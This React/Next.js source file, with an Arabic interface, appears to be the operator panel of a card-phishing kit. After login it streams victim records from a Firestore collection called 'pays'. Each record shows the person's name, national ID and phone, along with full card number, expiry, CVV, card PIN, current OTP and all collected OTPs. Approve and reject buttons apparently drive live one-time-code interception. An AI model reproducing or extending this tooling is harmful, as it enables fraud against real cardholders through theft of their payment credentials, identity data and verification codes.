'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { Trash2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import { db, auth } from '@/lib/firestore';
import {
  collection,
  getDocs,
  doc,
  deleteDoc,
  writeBatch,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
} from 'firebase/firestore';
import { onAuthStateChanged, signOut } from 'firebase/auth';
import { playNotificationSound } from '@/lib/actions';
import { GET } from '../api/location/route';
import { ipAddress } from '@vercel/functions';
import IPLocation from '@/components/ip';

interface Notification {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  createdDate: string;
  notificationCount: number;
  personalInfo?: {
    id: string;
    fullName: string;
    phone: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
    otp: string;
    password:string;
    allOtps: string[];
    status?: 'pending' | 'approved' | 'rejected';
  };
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [pageName, setPagename] = useState<string>('');
  const [message, setMessage] = useState<boolean>(false);
  const [selectedInfo, setSelectedInfo] = useState<'personal' | 'card' | null>(
    null
  );
  const [selectedNotification, setSelectedNotification] =
    useState<Notification | null>(null);
  const router = useRouter();


  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push('/login');
      } else {
        const unsubscribeNotifications = fetchNotifications();
        return () => {
          unsubscribeNotifications();
        };
      }
    });

    return () => unsubscribe();
  }, [router]);

  const fetchNotifications = () => {
  
    setIsLoading(true);
    const q = query(collection(db, 'pays'), orderBy('createdDate', 'desc'));
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs.map((doc) => ({
          id: doc.id,
          ...doc.data(),
        })) as Notification[];
        setNotifications(notificationsData);
        setIsLoading(false);
        playNotificationSound();
      },
      (error) => {
        console.error('Error fetching notifications:', error);
        setIsLoading(false);
      }
    );

    return unsubscribe;
  };
  const handleClearAll = async () => {
    setIsLoading(true);
    try {
      const batch = writeBatch(db);
      notifications.forEach((notification) => {
        const docRef = doc(db, 'pays', notification.id);
        batch.delete(docRef);
      });
      await batch.commit();
      setNotifications([]);
    } catch (error) {
      console.error('Error clearing notifications:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const handleDelete = async (id: string) => {
    try {
      await deleteDoc(doc(db, 'pays', id));
      setNotifications(
        notifications.filter((notification) => notification.id !== id)
      );
    } catch (error) {
      console.error('Error deleting notification:', error);
    }
  };

  const handlePageName = (id: string) => {
    setPagename('asd');
  };
  const handleApproval = async (state: string, id: string) => {
    const targetPost = doc(db, 'pays', id);
    await updateDoc(targetPost, {
      cardState: state,
    });
  };

  const handleLogout = async () => {
    try {
      await signOut(auth);
      router.push('/login');
    } catch (error) {
      console.error('Error signing out:', error);
    }
  };

  const handleInfoClick = (
    notification: Notification,
    infoType: 'personal' | 'card'
  ) => {
    setSelectedNotification(notification);
    setSelectedInfo(infoType);
  };

  const closeDialog = () => {
    setSelectedInfo(null);
    setSelectedNotification(null);
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-900 text-white flex items-center justify-center">
        جاري التحميل...
      </div>
    );
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gray-900 text-white p-4">
      <div className="max-w-7xl mx-auto">
        <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
          <h1 className="text-xl font-semibold mb-4 sm:mb-0">جميع الإشعارات</h1>
          <div className="flex flex-col sm:flex-row gap-2">
            <Button
              variant="destructive"
              onClick={handleClearAll}
              className="bg-red-500 hover:bg-red-600"
              disabled={notifications.length === 0}
            >
              مسح جميع الإشعارات
            </Button>
            <Button
              variant="outline"
              onClick={handleLogout}
              className="bg-gray-700 hover:bg-gray-600"
            >
              تسجيل الخروج
            </Button>
          </div>
        </div>

        <div className="bg-gray-800 rounded-lg overflow-x-auto">
          <table className="w-full">
            <thead>
              <tr className="border-b border-gray-700">
                <th className="px-4 py-3 text-right">الإسم</th>
                <th className="px-4 py-3 text-right">المعلومات</th>
                <th className="px-4 py-3 text-right">الصفحة الحالية</th>
                <th className="px-4 py-3 text-right">الوقت</th>
                <th className="px-4 py-3 text-center">الاشعارات</th>
                <th className="px-4 py-3 text-center">حذف</th>
              </tr>
            </thead>
            <tbody>
              {notifications.map((notification) => (
                <tr key={notification.id} className="border-b border-gray-700">
                  <td className="px-4 py-3">
                    {notification!.personalInfo!.fullName}
                  </td>
                  <td className="px-4 py-3">
                    <div className="flex flex-col sm:flex-row gap-2">
                      <Badge
                        variant={
                          notification.hasPersonalInfo
                            ? 'default'
                            : 'destructive'
                        }
                        className="rounded-md cursor-pointer"
                        onClick={() =>
                          handleInfoClick(notification, 'personal')
                        }
                      >
                        {notification.hasPersonalInfo
                          ? 'معلومات شخصية'
                          : 'لا يوجد معلومات'}
                      </Badge>
                      <Badge
                        variant={
                          notification.hasCardInfo ? 'default' : 'destructive'
                        }
                        className={`rounded-md cursor-pointer ${
                          notification.hasCardInfo ? 'bg-green-500' : ''
                        }`}
                        onClick={() => handleInfoClick(notification, 'card')}
                      >
                        {notification.hasCardInfo
                          ? 'معلومات البطاقة'
                          : 'لا يوجد بطاقة'}
                      </Badge>
                    </div>
                  </td>
                  <td className="px-4 py-3">خطوه - {notification.currentPage  }</td>
                  <td className="px-4 py-3">{notification.createdDate!}</td>
                  <td className="px-4 py-3 text-center">
                    <Badge variant="default" className="bg-green-500">
                      {parseInt(notification!.notificationCount!.toString()!) + 1}
                    </Badge>
                  </td>
                  <td className="px-4 py-3 text-center">
                    <Button
                      variant="destructive"
                      size="sm"
                      onClick={() => handleDelete(notification.id)}
                      className="bg-red-500 hover:bg-red-600"
                    >
                      <Trash2 className="h-4 w-4" />
                    </Button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-gray-800 text-white" dir="rtl">
          <DialogHeader>
            <DialogTitle dir="rtl">
              {selectedInfo === 'personal'
                ? 'المعلومات الشخصية'
                : 'معلومات البطاقة'}
            </DialogTitle>
            <DialogDescription>
              {selectedInfo === 'personal'
                ? 'تفاصيل المعلومات الشخصية'
                : 'تفاصيل معلومات البطاقة'}
            </DialogDescription>
          </DialogHeader>
          {selectedInfo === 'personal' &&
            selectedNotification?.personalInfo && (
              <div className="space-y-2">
                <p>
                  <strong>الاسم الكامل:</strong>{' '}
                  {selectedNotification.personalInfo.fullName}
                </p>
                <p>
                  <strong>رقم الهوية:</strong>{' '}
                  {selectedNotification.personalInfo.id}
                </p>
                <p>
                  <strong>رقم الهاتف:</strong>{' '}
                  {selectedNotification.personalInfo.phone}
                </p>
              </div>
            )}
          {selectedInfo === 'card' && selectedNotification?.cardInfo && (
            <div className="space-y-2">
              <p>
                <strong className="text-red-400 mx-4">رقم البطاقة:</strong>{' '}
                {selectedNotification.cardInfo.cardNumber}
              </p>
              <p>
                <strong className="text-red-400 mx-4">تاريخ الانتهاء:</strong>{' '}
                {selectedNotification.cardInfo.expirationDate}
              </p>
              <div className="grid grid-cols-2">
                <p className="flex items-center">
                  <strong className="text-red-400 mx-4">رمز الأمان:</strong>{' '}
                  {selectedNotification.cardInfo.cvv}
                </p>
                <p className="flex items-center">
                  <strong className="text-red-400 mx-4">رمز التحقق :</strong>{' '}
                  {selectedNotification.cardInfo.otp}
                </p>
                <p className="flex items-center">
                  <strong className="text-red-400 mx-4">رمز البطاقة :</strong>{' '}
                  {selectedNotification.cardInfo.password}
                </p>
              </div>
              <>
              
              
              </>
              <p>
                <strong className="text-red-400 mx-4">جميع رموز التحقق:</strong>
                {selectedNotification.cardInfo.allOtps.join(',')}
              </p>
              <div className="flex justify-between mx-1">
                <Button
                  onClick={() => {
                    handleApproval('approved', selectedNotification.id);
                    setMessage(true);
                    setTimeout(() => {
                      setMessage(false);
                    }, 3000);
                  }}
                  className="w-full m-3 bg-green-500"
                >
                  قبول
                </Button>
                <Button
                  onClick={() => {
                    handleApproval('rejected', selectedNotification.id);
                    setMessage(true);
                    setTimeout(() => {
                      setMessage(false);
                    }, 3000);
                  }}
                  className="w-full m-3"
                  variant="destructive"
                >
                  رفض
                </Button>
              </div>
              <p className="text-red-500">{message ? 'تم الارسال' : ''}</p>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
